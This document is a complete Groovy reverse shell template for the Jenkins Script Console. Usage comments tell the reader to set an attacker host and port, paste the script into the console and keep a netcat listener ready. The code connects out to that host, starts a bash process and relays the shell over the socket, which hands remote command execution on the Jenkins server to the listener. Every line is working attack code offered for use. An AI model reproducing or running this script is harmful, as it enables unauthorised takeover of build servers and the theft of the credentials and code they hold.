// Jenkins script console reverse shell template.
// Usage: Update LHOST/LPORT, paste into the Script Console, and keep a listener (nc -lvnp <port>) ready.

import java.io.*
import java.net.*

String LHOST = System.getenv('LHOST') ?: '127.0.0.1'
int LPORT = Integer.parseInt(System.getenv('LPORT') ?: '9001')
String SHELL = System.getenv('SHELL_PATH') ?: '/bin/bash'

Socket socket = new Socket(LHOST, LPORT)
Process process = new ProcessBuilder(SHELL).redirectErrorStream(true).start()

InputStream socketIn = socket.getInputStream()
OutputStream socketOut = socket.getOutputStream()
InputStream procIn = process.getInputStream()
OutputStream procOut = process.getOutputStream()

Thread.start { socketIn.transferTo(procOut) }
Thread.start { procIn.transferTo(socketOut) }

process.waitFor()
socket.close()
